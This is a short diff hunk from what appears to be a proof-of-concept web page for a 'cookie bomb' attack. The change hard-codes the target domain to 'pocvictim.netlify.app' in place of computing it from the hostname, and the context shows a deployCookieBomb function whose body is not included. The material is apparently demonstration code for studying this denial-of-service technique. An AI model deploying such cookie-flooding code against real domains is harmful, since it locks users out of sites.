@@ -37,12 +37,7 @@
         }
       }
       function getRootDomain() {
-        var parts = window.location.hostname.split('.');
-        if (parts.length > 2) {
-          return '.' + parts.slice(-2).join('.');
-        } else {
-          return window.location.hostname;
-        }
+        return "pocvictim.netlify.app"
       }
       // Main cookie bomb function
       function deployCookieBomb() {
